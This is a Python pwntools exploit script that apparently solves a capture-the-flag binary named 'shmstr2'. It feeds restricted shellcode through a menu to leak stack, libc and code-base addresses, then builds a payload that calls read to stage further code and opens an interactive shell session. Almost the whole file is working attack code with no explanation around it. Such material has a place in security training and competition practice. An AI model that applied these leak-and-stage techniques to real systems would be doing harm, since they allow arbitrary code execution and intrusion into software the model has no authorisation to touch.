from pwn import *

io = process("./shmstr2",env={"LD_PRELOAD":"./libc.so"})

def add(shell):
    io.sendlineafter("> ","1")
    io.sendafter("{?} Enter shellcode: ",shell)

def view(idx):
    io.sendlineafter("> ","2")
    io.sendlineafter("{?} Enter idx: ",str(idx))

def delete(idx):
    io.sendlineafter("> ","3")
    io.sendlineafter("{?} Enter idx: ",str(idx))

def run(idx):
    io.sendlineafter("> ","4")
    io.sendlineafter("{?} Enter idx: ",str(idx))

if __name__ == "__main__":
    s = asm("""
    pop edx
    push edx
    push esp
    pop eax
    inc ebp
    dec ebp
    inc ebp
    dec ebp
    inc ebp
    dec ebp
    inc ebp
    dec ebp
    inc ebp
    dec ebp
    inc ebp
    dec ebp
    """)
    add(s)
    run(0)
    io.recvuntil("Shellcode return code = ")
    leak = int(io.recvline().strip(),16)
    log.success("leak = " + hex(leak))
    s = asm("""
            push esi
            pop eax
            inc ebp
            dec ebp
            inc ebp
            dec ebp
            inc ebp
            dec ebp
            inc ebp
            dec ebp
            inc ebp
            dec ebp
            inc ebp
            dec ebp
            inc ebp
            dec ebp
            """)
    add(s)
    run(1)
    io.recvuntil("Shellcode return code = ")
    libc = int(io.recvline().strip(),16) - 0x1b0000
    log.success("libc = " + hex(libc))
    s = asm("""
        pop eax
        push eax
        pop eax
        push eax
        pop eax
        push eax
        pop eax
        push eax
        pop eax
        push eax
        pop eax
        push eax
        pop eax
        push eax
        pop eax
        push eax
        pop eax
        push eax
        pop eax
        push eax
        pop eax
        push eax
        """)

    add(s)
    run(2)
    io.recvuntil("Shellcode return code = ")
    code = int(io.recvline().strip(),16) - 0x17df
    read_plt = code + 0x00001150
    log.success("code = " + hex(code))
    print(hex(read_plt))
    pay = asm("""
              pop ecx
              pop edx
              dec edx
              dec edx
              push {}
              pop eax
              xor al, 0x70
              push ebp
              push edx
              push ecx
              push eax
              """.format(read_plt))
    #push ecx
    #push eax
    print(pay)
    print(len(pay))
    add(pay)
    if("Invalid" not in io.recvline()):
        gdb.attach(io)
        run(3)
        io.interactive()
    else:
        io.close()
